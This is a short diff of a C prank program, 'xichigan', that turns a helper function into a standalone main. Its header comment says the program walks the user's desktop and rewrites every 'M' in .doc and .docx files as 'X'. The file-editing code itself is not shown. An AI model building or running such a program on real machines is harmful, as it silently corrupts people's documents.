@@ -1,11 +1,16 @@
-#include "Xichigan.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <dirent.h>
+#include <string.h>
+#include <sys/stat.h>
+
 #define PATH_MAX        4096    /* # chars in a path name including nul */
 
 /*********************************************************************************
 * Author: Laine Rumreich								       				 				   *
 *																				 							*
 *																				 							*
-* Called from: main.c										 					 					*
+* Compile: gcc -o xichigan xichigan.c					 					 					*
 *																				 							*
 * Functions to search for .doc and .docx files on the desktop                    *
 * of the current user, open them, and replace every 'M' or 'm' with 'X'          *
@@ -117,7 +122,7 @@ void spiderDirectory(char *homeDir, DIR *d){
 /*********************************************************************************
 Main Function
 **********************************************************************************/
-void MtoX() {
+int main(int argc, char*argv[]) {
 	DIR *d;
 	char *homedir = getenv("HOME");
 
